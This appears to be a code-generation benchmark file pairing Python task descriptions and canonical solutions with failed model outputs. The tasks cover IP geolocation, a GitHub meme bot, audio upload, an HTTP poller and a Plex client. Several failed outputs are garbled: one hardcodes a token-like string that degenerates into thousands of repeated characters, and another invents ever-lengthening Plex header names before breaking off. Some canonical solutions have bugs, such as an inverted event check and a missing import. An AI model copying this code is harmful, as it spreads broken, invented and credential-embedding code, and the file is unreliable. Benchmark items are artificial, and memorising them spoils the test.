[
  {
    "Task_id": 101,
    "Instruction": "Task Description: Create a Python class that implements a ScalarFunction to retrieve geographic location information for a given IP address using an external API.\n\nClass Description: The GetLocation class extends PyFlink's ScalarFunction to provide IP-to-location functionality. It makes HTTP requests to the ip2location.io API and processes the response to extract country, state, and city information.\n\nAttributes: None\n\nMethods:\n- eval(ip_address: str) -> str: \n  Takes an IP address as input, queries the ip2location.io API, and returns a JSON string containing the country code, region name, and city name. If the request fails, returns an empty JSON object. The API key is retrieved from environment variables.\n\n  Input Parameters:\n  - ip_address: str - The IP address to look up\n\n  Return Type:\n  - str - JSON string containing location information in format {'country': str, 'state': str, 'city': str} or empty object if request fails",
    "Canonical_solution": "import os\nimport json\nimport requests\nfrom pyflink.table.udf import ScalarFunction\nfrom pyflink.table import DataTypes\n\nclass GetLocation(ScalarFunction):\n    def eval(self, ip_address):\n        url = \"https://api.ip2location.io\"\n        response = requests.get(url, params={\n            'ip': ip_address,\n            'key': os.environ.get(\"IP_CODING_KEY\")\n        })\n\n        if response.status_code != 200:\n            return json.dumps({})\n\n        data = json.loads(response.text)\n        country = data.get('country_code', '')\n        state = data.get('region_name', '')\n        city = data.get('city_name', '')\n        return json.dumps({'country': country, 'state': state, 'city': city})",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nfrom pyflink.table import ScalarFunction\nimport requests\nimport json\n\nclass GetLocation(ScalarFunction):\n    def eval(self, ip_address: str) -> str:\n        api_key = os.getenv('IP2LOCATION_API_KEY')\n        url = f'https://api.ip2location.io/?ip={ip_address}&key={api_key}'\n        try:\n            response = requests.get(url)\n            response.raise_for_status()\n            data = response.json()\n            return json.dumps({'country': data['country_code'], 'state': data['region_name'], 'city': data['city_name']})\n        except requests.exceptions.RequestException:\n            return json.dumps({})\n```"
  },
  {
    "Task_id": 102,
    "Instruction": "Task Description: Create a function that handles GitHub webhook events for pull requests, fetches a random meme from an API, and posts it as a comment on the pull request.\n\nFunction Description: The function `bot()` is a webhook handler that processes GitHub pull request events. When a pull request is opened, it authenticates with the GitHub API, fetches a random meme from an external API, and posts the meme as a comment on the pull request. The function uses the `requests` library for HTTP communication with the meme API and the `PyGithub` library for GitHub interactions.\n\nInput: \n- The function receives a Flask `request` object containing JSON payload from GitHub webhook. The payload includes:\n  - `action`: The event type (e.g., \"opened\")\n  - `pull_request`: Details about the pull request\n  - `repository`: Information about the repository containing owner and name\n\nOutput: \n- Returns \"ok\" string in all cases (success or failure) to acknowledge webhook receipt\n- As a side effect, posts a meme comment on the pull request when conditions are met",
    "Canonical_solution": "import os\nimport requests\nfrom dotenv import load_dotenv\nfrom flask import Flask, request\nfrom github import Github, GithubIntegration\n\nload_dotenv()\n\n__flask_app_name__ = 'github_bot'\napp = Flask(__flask_app_name__)\napp_id = int(os.environ['GITHUB_APP_ID'])\nwith open(\n        os.path.normpath(os.path.expanduser(os.getenv(\"GITHUB_PRIVATE_KEY_FILE\", '~/.certs/github/bot_key.pem'))),\n        'r'\n) as cert_file:\n    app_key = cert_file.read()\n\ngit_integration = GithubIntegration(\n    app_id,\n    app_key,\n)\n\ndef bot():\n    payload = request.json\n    if not all(k in payload.keys() for k in ['action', 'pull_request']) and \\\n            payload['action'] == 'opened':\n        return \"ok\"\n    owner = payload['repository']['owner']['login']\n    repo_name = payload['repository']['name']\n    git_connection = Github(\n        login_or_token=git_integration.get_access_token(\n            git_integration.get_installation(owner, repo_name).id\n        ).token\n    )\n    repo = git_connection.get_repo(f\"{owner}/{repo_name}\")\n    issue = repo.get_issue(number=payload['pull_request']['number'])\n    response = requests.get(url='https://meme-api.herokuapp.com/gimme')\n    if response.status_code != 200:\n        return 'ok'\n    meme_url = response.json()['preview'][-1]\n    issue.create_comment(f\"![Alt Text]({meme_url})\")\n    return \"ok\"",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nfrom flask import Flask, request\nimport requests\nfrom github import Github\n\napp = Flask(__name__)\n\n@app.route('/webhook', methods=['POST'])\ndef bot():\n    event = request.json['action']\n    pr = request.json['pull_request']\n    repo = request.json['repository']\n    owner = repo['owner']['login']\n    repo_name = repo['name']\n    g = Github(\"github_pat_11A3YR4A0O0sJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJZJ"
  },
  {
    "Task_id": 103,
    "Instruction": "Task Description: Create a function that sends audio and transcript files to a server for processing using HTTP POST request and handles the response.\n\nFunction Description: The function `gentle_request` sends a WAV audio file and its corresponding transcript text file to a specified server using an HTTP POST request. It checks if the filenames match, reads the transcript content, and sends both files to the server. The function handles the server response, checks for errors, and optionally prints debug information.\n\nInput:\n- `wav_path` [str] - Path to the WAV audio file to be sent.\n- `txt_path` [str] - Path to the transcript text file corresponding to the audio.\n- `server_addr` [str] - IP address or hostname of the server.\n- `port` [int] - Port number on which the server is listening.\n- `debug` [bool, optional] - If True, prints the server response in JSON format. Default is False.\n\nOutput:\n- `response` [requests.Response or None] - The server's HTTP response object if the request is successful, otherwise None. The response can be parsed for status code, headers, and content.",
    "Canonical_solution": "from docopt import docopt\nfrom glob import glob\nfrom tqdm import tqdm\nimport os.path\nimport requests\nimport numpy as np\n\ndef gentle_request(wav_path,txt_path, server_addr, port, debug=False):\n    print('\\n')\n    response = None\n    wav_name = os.path.basename(wav_path)\n    txt_name = os.path.basename(txt_path)\n    if os.path.splitext(wav_name)[0] != os.path.splitext(txt_name)[0]:\n        print(' [!] wav name and transcript name does not match - exiting...')\n        return response\n    with open(txt_path, 'r', encoding='utf-8-sig') as txt_file:\n        print('Transcript - '+''.join(txt_file.readlines()))\n    with open(wav_path,'rb') as wav_file, open(txt_path, 'rb') as txt_file:\n        params = (('async','false'),)\n        files={'audio':(wav_name,wav_file),\n               'transcript':(txt_name,txt_file),\n               }\n        server_path = 'http://'+server_addr+':'+str(port)+'/transcriptions'\n        response = requests.post(server_path, params=params,files=files)\n        if response.status_code != 200:\n            print(' [!] External server({}) returned bad response({})'.format(server_path, response.status_code))\n    if debug:\n        print('Response')\n        print(response.json())\n    return response",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport requests\nimport os\n\ndef gentle_request(wav_path, txt_path, server_addr, port, debug=False):\n    if not os.path.isfile(wav_path) or not os.path.isfile(txt_path):\n        print(\"Error: File not found.\")\n        return None\n    if os.path.basename(wav_path) != os.path.basename(txt_path):\n        print(\"Error: File names do not match.\")\n        return None\n    with open(txt_path, 'r') as f:\n        transcript = f.read()\n    files = {'audio': open(wav_path, 'rb'), 'transcript': open(txt_path, 'rb')}\n    url = f\"http://{server_addr}:{port}/api/transcript\"\n    response = requests.post(url, files=files, data={'transcript': transcript})\n    if debug:\n        print(response.json())\n    return response\n```"
  },
  {
    "Task_id": 106,
    "Instruction": "Task Description: Create a Python class that implements an HTTP client for interacting with a remote API, featuring automatic retries for failed requests, background polling for data refresh, and graceful shutdown handling.\n\nClass Description: The Fetcher class provides a robust HTTP client implementation for API interactions with features like exponential backoff retries, periodic background data refreshing, and proper thread cleanup on program exit.\n\nAttributes:\n- _base_url: str - The base URL for API endpoints\n- _api_key: str - API key for authentication\n- _stop_polling_event: Event - Threading event to control polling thread lifecycle\n- _exit_monitor: Thread - Thread that monitors main thread for program exit\n- _poller_thread: Thread - Thread that handles periodic data refreshing\n\nMethods:\n- __init__(base_url: str, api_key: str) -> None - Initializes the fetcher with API configuration\n- run() -> None - Starts the background polling and exit monitoring threads\n- post(api: str, body: Dict[str, str]) -> None - Sends a POST request to specified API endpoint\n- _fetch_url(url: str, api_key: str) -> Dict - Performs a GET request with retry logic (private)\n- _post_url(url: str, api_key: str, body: Dict[str, str]) -> None - Performs a POST request (private)\n- _thread_func(base_url: str, api_key: str, stop_polling_event: Event, seconds_interval: Optional[int]) -> None - Background polling thread function (private)\n- _refresh_data(base_url: str, api_key: str) -> None - Refreshes data from multiple endpoints (private)\n- _monitor_exit(exit_event: Event) -> None - Monitors main thread for program exit (private)",
    "Canonical_solution": "import logging\nimport os\nimport threading\nimport time\nimport typing\nimport requests\n\nfrom threading import Thread, Event\nfrom typing import Dict, Optional\nfrom tenacity import (\n    RetryError,\n    retry,\n    stop_after_attempt,\n    wait_exponential,\n    retry_if_exception,\n)\n\nclass Fetcher:\n    def __init__(self, base_url: str, api_key: str):\n        self._base_url = base_url\n        self._api_key = api_key\n        self._stop_polling_event = Event()\n        self._exit_monitor = Thread(\n            target=self._monitor_exit, args=(self._stop_polling_event,), daemon=True\n        )\n        self._poller_thread = Thread(\n            target=self._thread_func,\n            args=(\n                self._base_url,\n                self._api_key,\n                self._stop_polling_event,\n                int(os.getenv(\"TRACELOOP_PROMPT_MANAGER_POLLING_INTERVAL\") or 5),\n            ),\n        )\n\n    def run(self):\n        self._refresh_data(self._base_url, self._api_key)\n        self._exit_monitor.start()\n        self._poller_thread.start()\n\n    def post(self, api: str, body: Dict[str, str]):\n        self._post_url(f\"{self._base_url}/v1/traceloop/{api}\", self._api_key, body)\n\n    @retry(\n        wait=wait_exponential(multiplier=1, min=4),\n        stop=stop_after_attempt(int(os.getenv(\"TRACELOOP_PROMPT_MANAGER_MAX_RETRIES\") or 3)),\n        retry=retry_if_exception(lambda e: isinstance(e, requests.exceptions.HTTPError) and (500 <= e.response.status_code < 600),\n    )\n    def _fetch_url(self, url: str, api_key: str):\n        response = requests.get(\n            url,\n            headers={\n                \"Authorization\": f\"Bearer {api_key}\",\n                \"X-Traceloop-SDK-Version\": \"1.0.0\",\n            },\n        )\n\n        if response.status_code != 200:\n            if response.status_code == 401 or response.status_code == 403:\n                logging.error(\"Authorization error: Invalid Traceloop API key.\")\n                raise requests.exceptions.HTTPError(response=response)\n            else:\n                logging.error(\"Request failed: %s\", response.status_code)\n                raise requests.exceptions.HTTPError(response=response)\n        else:\n            return response.json()\n\n    def _post_url(self, url: str, api_key: str, body: Dict[str, str]):\n        response = requests.post(\n            url,\n            headers={\n                \"Authorization\": f\"Bearer {api_key}\",\n                \"X-Traceloop-SDK-Version\": \"1.0.0\",\n            },\n            json=body,\n        )\n\n        if response.status_code != 200:\n            raise requests.exceptions.HTTPError(response=response)\n\n    def _thread_func(self, base_url: str, api_key: str, stop_polling_event: Event, seconds_interval: Optional[int] = 5):\n        while not stop_polling_event.is_set():\n            try:\n                self._refresh_data(base_url, api_key)\n            except RetryError:\n                logging.error(\"Request failed after retries : stopped polling\")\n                break\n\n            time.sleep(seconds_interval)\n\n    def _refresh_data(self, base_url: str, api_key: str):\n        self._fetch_url(f\"{base_url}/v1/traceloop/prompts\", api_key)\n        self._fetch_url(f\"{base_url}/v1/traceloop/pii/tracing-allow-list\", api_key)\n\n    def _monitor_exit(self, exit_event: Event):\n        main_thread = threading.main_thread()\n        main_thread.join()\n        exit_event.set()",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport requests\nimport time\nimport threading\nfrom typing import Dict, Optional\nfrom requests.exceptions import RequestException\nfrom threading import Event\n\nclass Fetcher:\n    def __init__(self, base_url: str, api_key: str) -> None:\n        self._base_url = base_url\n        self._api_key = api_key\n        self._stop_polling_event = Event()\n        self._exit_monitor = threading.Thread(target=self._monitor_exit, args=(self._stop_polling_event,))\n        self._poller_thread = threading.Thread(target=self._thread_func, args=(self._base_url, self._api_key, self._stop_polling_event, None))\n\n    def run(self) -> None:\n        self._poller_thread.start()\n        self._exit_monitor.start()\n\n    def post(self, api: str, body: Dict[str, str]) -> None:\n        url = f\"{self._base_url}/{api}\"\n        self._post_url(url, self._api_key, body)\n\n    def _fetch_url(self, url: str, api_key: str) -> Dict:\n        retries = 0\n        while retries < 5:\n            try:\n                response = requests.get(url, headers={\"Authorization\": f\"Bearer {api_key}\"})\n                response.raise_for_status()\n                return response.json()\n            except RequestException:\n                retries += 1\n                time.sleep(2 ** retries)\n        raise Exception(\"Failed to fetch data after multiple retries\")\n\n    def _post_url(self, url: str, api_key: str, body: Dict[str, str]) -> None:\n        try:\n            response = requests.post(url, json=body, headers={\"Authorization\": f\"Bearer {api_key}\"})\n            response.raise_for_status()\n        except RequestException:\n            raise Exception(\"Failed to post data\")\n\n    def _thread_func(self, base_url: str, api_key: str, stop_polling_event: Event, seconds_interval: Optional[int]) -> None:\n        while not stop_polling_event.is_set():\n            self._refresh_data(base_url, api_key)\n            if seconds_interval is not None:\n                stop_polling_event.wait(seconds_interval)\n\n    def _refresh_data(self, base_url: str, api_key: str) -> None:\n        # Implement data refresh logic here\n        pass\n\n    def _monitor_exit(self, exit_event: Event) -> None:\n        exit_event.wait()\n```\n"
  },
  {
    "Task_id": 109,
    "Instruction": "Task Description: Implement a Python class to interact with a Plex Media Server using HTTP requests, including functionality for making authenticated requests, validating server connections, and updating media libraries.\n\nClass Description: PlexMediaServer is a class that provides methods to communicate with a Plex Media Server instance. It handles HTTP requests with proper authentication, validates server connections and library access, and triggers library updates.\n\nAttributes:\n- TIMEOUT: [int] - Default timeout in seconds for HTTP requests\n- object: [object] - The media server instance containing configuration options\n\nMethods:\n- __init__(mediaserver_instance: object) -> None - Initializes the PlexMediaServer with a media server instance containing configuration options\n- make_request(uri: str = '/', params: dict = {}) -> requests.Response - Makes an authenticated HTTP GET request to the Plex server with proper headers and SSL verification handling\n- validate() -> bool - Validates the connection to the Plex server and checks if configured libraries exist, raising exceptions for any issues\n- update() -> bool - Triggers refresh operations for all configured libraries, raising exceptions for any failures",
    "Canonical_solution": "import requests\nfrom urllib.parse import urlsplit, urlunsplit, urlencode\nimport warnings\n\nclass PlexMediaServer:\n    TIMEOUT = 5\n\n    def __init__(self, mediaserver_instance):\n        self.object = mediaserver_instance\n\n    def make_request(self, uri='/', params={}):\n        headers = {'User-Agent': 'TubeSync'}\n        token = self.object.loaded_options['token']\n        params['X-Plex-Token'] = token\n        base_parts = urlsplit(self.object.url)\n        qs = urlencode(params)\n        url = urlunsplit((base_parts.scheme, base_parts.netloc, uri, qs, ''))\n        \n        if self.object.verify_https:\n            return requests.get(url, headers=headers, verify=True, timeout=self.TIMEOUT)\n        else:\n            with warnings.catch_warnings():\n                warnings.simplefilter(\"ignore\")\n                return requests.get(url, headers=headers, verify=False, timeout=self.TIMEOUT)\n\n    def validate(self):\n        try:\n            response = self.make_request('/library/sections')\n            if response.status_code != 200:\n                check_token = ''\n                if 400 <= response.status_code < 500:\n                    check_token = (' A 4XX error could mean your access token is being rejected.')\n                raise Exception(f'Invalid HTTP status code: {response.status_code}.' + check_token)\n            \n            parsed_response = ElementTree.fromstring(response.content)\n            remote_libraries = {}\n            for parent in parsed_response.iter('MediaContainer'):\n                for d in parent:\n                    library_id = d.attrib['key']\n                    library_name = d.attrib['title']\n                    remote_libraries[library_id] = library_name\n            \n            libraries = self.object.loaded_options['libraries'].strip().split(',')\n            for library_id in libraries:\n                library_id = library_id.strip()\n                if library_id not in remote_libraries:\n                    raise Exception(f'Library ID \"{library_id}\" does not exist on Plex Media Server')\n            return True\n            \n        except Exception as e:\n            raise Exception(f'Validation failed: {str(e)}')\n\n    def update(self):\n        libraries = self.object.loaded_options.get('libraries', '')\n        for library_id in libraries.split(','):\n            library_id = library_id.strip()\n            uri = f'/library/sections/{library_id}/refresh'\n            response = self.make_request(uri)\n            if response.status_code != 200:\n                raise Exception(f'Failed to refresh library \"{library_id}\", status code: {response.status_code}')\n        return True",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport requests\nimport logging\nimport json\n\nclass PlexMediaServer:\n    TIMEOUT = 10\n\n    def __init__(self, mediaserver_instance: object) -> None:\n        self.object = mediaserver_instance\n\n    def make_request(self, uri: str = '/', params: dict = {}) -> requests.Response:\n        headers = {\n            'X-Plex-Token': self.object.token,\n            'X-Plex-Client-Identifier': self.object.client_id,\n            'X-Plex-Product': self.object.product,\n            'X-Plex-Version': self.object.version,\n            'X-Plex-Device': self.object.device,\n            'X-Plex-Device-Name': self.object.device_name,\n            'X-Plex-Platform': self.object.platform,\n            'X-Plex-Platform-Version': self.object.platform_version,\n            'X-Plex-Provides': self.object.provides,\n            'X-Plex-Container-Size': self.object.container_size,\n            'X-Plex-Container-Start': self.object.container_start,\n            'X-Plex-Container-Total': self.object.container_total,\n            'X-Plex-Total-Library-Sections': self.object.total_library_sections,\n            'X-Plex-User-ID': self.object.user_id,\n            'X-Plex-Username': self.object.username,\n            'X-Plex-Access-Levels': self.object.access_levels,\n            'X-Plex-Notifications-Active': self.object.notifications_active,\n            'X-Plex-Notifications-Size': self.object.notifications_size,\n            'X-Plex-Transcoder-From': self.object.transcoder_from,\n            'X-Plex-Transcoder-To': self.object.transcoder_to,\n            'X-Plex-Video-Resolution': self.object.video_resolution,\n            'X-Plex-Video-Codec': self.object.video_codec,\n            'X-Plex-Audio-Codec': self.object.audio_codec,\n            'X-Plex-Subtitle-Codec': self.object.subtitle_codec,\n            'X-Plex-Protocol': self.object.protocol,\n            'X-Plex-Client-Platform': self.object.client_platform,\n            'X-Plex-Client-Platform-Version': self.object.client_platform_version,\n            'X-Plex-Client-Product': self.object.client_product,\n            'X-Plex-Client-Version': self.object.client_version,\n            'X-Plex-Client-Device': self.object.client_device,\n            'X-Plex-Client-Device-Name': self.object.client_device_name,\n            'X-Plex-Client-Device-OS': self.object.client_device_os,\n            'X-Plex-Client-Device-OS-Version': self.object.client_device_os_version,\n            'X-Plex-Client-Device-Model': self.object.client_device_model,\n            'X-Plex-Client-Device-Model-Number': self.object.client_device_model_number,\n            'X-Plex-Client-Device-Serial': self.object.client_device_serial,\n            'X-Plex-Client-Device-UUID': self.object.client_device_uuid,\n            'X-Plex-Client-Device-Address': self.object.client_device_address,\n            'X-Plex-Client-Device-Port': self.object.client_device_port,\n            'X-Plex-Client-Device-Protocol': self.object.client_device_protocol,\n            'X-Plex-Client-Device-Protocol-Version': self.object.client_device_protocol_version,\n            'X-Plex-Client-Device-Protocol-Encryption': self.object.client_device_protocol_encryption,\n            'X-Plex-Client-Device-Protocol-Encryption-Version': self.object.client_device_protocol_encryption_version,\n            'X-Plex-Client-Device-Protocol-Encryption-Algorithm': self.object.client_device_protocol_encryption_algorithm,\n            'X-Plex-Client-Device-Protocol-Encryption-Algorithm-Version': self.object.client_device_protocol_encryption_algorithm_version,\n            'X-Plex-Client-Device-Protocol-Encryption-Algorithm-Name': self.object.client_device_protocol_encryption_algorithm_name,\n            'X-Plex-Client-Device-Protocol-Encryption-Algorithm-Name-Version': self.object.client_device_protocol_encryption_algorithm_name_version,\n            'X-Plex-Client-Device-Protocol-Encryption-Algorithm-Name-Version-Name': self.object.client_device_protocol_encryption_algorithm_name_version_name,\n            'X-Plex-Client-Device-Protocol-Encryption-Algorithm-Name-Version-Name-Version': self.object.client_device_protocol_encryption_algorithm_name_version_name_version,\n            'X-Plex-Client-Device-Protocol-Encryption-Algorithm-Name-Version-Name-Version-Name': self.object.client_device_protocol_encryption_algorithm_name_version_name_version_name,\n            'X-Plex-Client-Device-Protocol-Encryption-Algorithm-Name-Version-Name-Version-Name-Version-Name': self.object.client_device_protocol_encryption_algorithm_name_version_name_version_name_version_name,\n            'X-Plex-Client-Device-Protocol-Encryption-Algorithm-Name-Version-Name-Version-Name-Version-Name-Version': self.object.client_device_protocol_encryption_algorithm_name_version_name_version_name_version_name_version,\n            'X-Plex-Client-Device-Protocol-Encryption-Algorithm-Name-Version-Name-Version-Name-Version-Name-Version-Version': self.object.client_device_protocol_encryption_algorithm_name_version_name_version_name_version_name_version_version,\n            'X-Plex-Client-Device-Protocol-Encryption-Algorithm-Name-Version-Name-Version-Name-Version-Name-Version-Version-Version': self.object.client_device_protocol_encryption_algorithm_name_version_name_version_name_version_name_version_version_version,\n            'X-Plex-Client-Device-Protocol-Encryption-Algorithm-Name-Version-Name-Version-Name-Version-Name-Version-Version-Version-Version': self.object.client_device_protocol_encryption_algorithm_name_version_name_version_name_version_name_version_version_version_version,\n            'X-Plex-Client-Device-Protocol-Encryption-Algorithm-Name-Version-Name-Version-Name-Version-Name-Version-Version-Version-Version-Version-Version': self.object.client_device_protocol_encryption_algorithm_name_version_name_version_name_version_name_version_version_version_version_version_version,\n            'X-Plex-Client-Device-Protocol-Encryption-Algorithm-Name-Version-Name-Version-Name-Version-Name-Version-Version-Version-Version-Version-Version-Version-Version': self.object.client_device_protocol_encryption_algorithm_name_version_name_version_name_version_name_version_version_version_version_version_version_version_version,\n            'X-Plex-Client-Device-Protocol-Encryption-Algorithm-Name-Version-Name-Version-Name-Version-Name-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version': self.object.client_device_protocol_encryption_algorithm_name_version_name_version_name_version_name_version_version_version_version_version_version_version_version_version_version,\n            'X-Plex-Client-Device-Protocol-Encryption-Algorithm-Name-Version-Name-Version-Name-Version-Name-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version': self.object.client_device_protocol_encryption_algorithm_name_version_name_version_name_version_name_version_version_version_version_version_version_version_version_version_version_version_version,\n            'X-Plex-Client-Device-Protocol-Encryption-Algorithm-Name-Version-Name-Version-Name-Version-Name-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version': self.object.client_device_protocol_encryption_algorithm_name_version_name_version_name_version_name_version_version_version_version_version_version_version_version_version_version_version_version_version_version,\n            'X-Plex-Client-Device-Protocol-Encryption-Algorithm-Name-Version-Name-Version-Name-Version-Name-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version': self.object.client_device_protocol_encryption_algorithm_name_version_name_version_name_version_name_version_version_version_version_version_version_version_version_version_version_version_version_version_version_version_version,\n            'X-Plex-Client-Device-Protocol-Encryption-Algorithm-Name-Version-Name-Version-Name-Version-Name-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version': 